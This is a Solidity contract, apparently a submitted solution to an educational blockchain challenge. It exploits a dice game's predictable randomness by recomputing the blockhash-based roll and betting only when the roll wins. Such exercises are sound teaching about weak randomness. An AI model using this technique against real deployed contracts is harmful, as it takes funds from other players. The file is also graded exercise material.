pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    error NotEnoughBalance();
    error NoBalanceToWithdraw();
    error FailedToSendEther();
    error NotGoingToWin();
    error InsufficientBalance();

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    function withdraw(address payable to, uint256 amount) public onlyOwner {
        console.log("## RiggedRoll: Withdrawing balance:", address(this).balance);
        console.log("## RiggedRoll: Withdrawing to:", to);
        console.log("## RiggedRoll: Withdrawing amount:", amount);

        if (amount == 0) {
            console.log("## RiggedRoll: No amount to withdraw");
            revert NoBalanceToWithdraw();
        }

        if (address(this).balance < amount) {
            console.log("## RiggedRoll: Insufficient balance");
            revert InsufficientBalance();
        }

        (bool sent, ) = to.call{ value: amount }("");
        if (!sent) {
            console.log("## RiggedRoll: Failed to send Ether");
            revert FailedToSendEther();
        }

        console.log("## RiggedRoll: Withdrawn successfully");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public payable {
        console.log("## RiggedRoll: Starting rigged roll");
        console.log("## RiggedRoll: Incoming msg.value:", msg.value);
        console.log("## RiggedRoll: Contract balance before:", address(this).balance);

        if (msg.value < 0.002 ether) {
            console.log("## RiggedRoll: It's better to send at least 0.002 ETH");
        }
        if (address(this).balance < 0.002 ether) {
            console.log("## RiggedRoll: Contract needs at least 0.002 ETH balance");
            revert NotEnoughBalance();
        }

        // Predict the outcome by replicating DiceGame's randomness calculation
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        console.log("## RiggedRoll: Predicted roll outcome:", roll);
        console.log("## RiggedRoll: Current nonce:", diceGame.nonce());
        console.log("## RiggedRoll: Contract balance:", address(this).balance);

        // Skip if we're not going to win
        if (roll > 5) {
            console.log("## ^^^RiggedRoll: Not going to win, skipping");
            revert NotGoingToWin();
        }

        console.log("## RiggedRoll: Rolling the dice");
        diceGame.rollTheDice{ value: 0.002 ether }();
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
